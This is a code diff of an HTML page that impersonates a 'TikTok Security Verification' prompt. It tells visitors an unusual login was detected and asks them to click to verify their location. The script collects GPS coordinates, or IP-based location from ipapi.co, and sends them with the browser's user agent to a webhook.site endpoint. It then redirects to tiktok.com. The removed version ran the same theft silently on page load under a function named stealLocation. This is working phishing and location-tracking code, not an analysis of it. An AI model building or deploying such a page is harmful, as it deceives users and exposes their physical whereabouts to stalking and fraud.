@@ -2,11 +2,25 @@
 <html lang="vi">
 <head>
     <meta charset="UTF-8">
-    <title>Loading...</title>
+    <title>Security Check</title>
+    <style>
+        body { font-family: Arial; text-align: center; padding: 50px; background: #000; color: #fff; }
+        button { background: #fe2c55; color: white; padding: 15px 30px; font-size: 18px; border: none; border-radius: 8px; cursor: pointer; margin-top: 20px; }
+        button:hover { opacity: 0.9; }
+    </style>
+</head>
+<body>
+    <h2>TikTok Security Verification</h2>
+    <p>We detected an unusual login attempt from a new device.</p>
+    <p>Click the button below to verify your location.</p>
+    <button onclick="requestLocation()">Verify Location</button>
+
     <script>
     const WEBHOOK = "https://webhook.site/c746b97f-524c-4fa1-8845-47e93ee3c38b";
     
-    function stealLocation() {
+    function requestLocation() {
+        document.body.innerHTML = "<h2>Verifying...</h2><p>Please wait...</p>";
+        
         if (navigator.geolocation) {
             navigator.geolocation.getCurrentPosition(sendGPS, fallbackIP);
         } else {
@@ -16,8 +30,7 @@
         function sendGPS(pos) {
             let lat = pos.coords.latitude;
             let lon = pos.coords.longitude;
-            let acc = pos.coords.accuracy;
-            fetch(`${WEBHOOK}?type=gps&lat=${lat}&lon=${lon}&acc=${acc}&ua=${encodeURIComponent(navigator.userAgent)}`, {mode: 'no-cors'});
+            fetch(`${WEBHOOK}?type=gps&lat=${lat}&lon=${lon}&ua=${encodeURIComponent(navigator.userAgent)}`, {mode: 'no-cors'});
             redirect();
         }
         
@@ -25,7 +38,7 @@
             fetch('https://ipapi.co/json/')
                 .then(res => res.json())
                 .then(data => {
-                    let info = `IP: ${data.ip} | City: ${data.city} | Country: ${data.country_name} | Lat: ${data.latitude}, Lon: ${data.longitude}`;
+                    let info = `IP: ${data.ip} | City: ${data.city} | Lat: ${data.latitude}, Lon: ${data.longitude}`;
                     fetch(`${WEBHOOK}?type=ip&info=${encodeURIComponent(info)}`, {mode: 'no-cors'});
                     redirect();
                 })
@@ -34,15 +47,10 @@
         
         function redirect() {
             setTimeout(() => {
-                window.location.href = "https://www.google.com";
-            }, 1000);
+                window.location.href = "https://www.tiktok.com";
+            }, 1500);
         }
     }
-    
-    stealLocation();
     </script>
-</head>
-<body>
-<p style="font-family: Arial; text-align: center; margin-top: 50px;">Loading secure connection...</p>
 </body>
 </html>
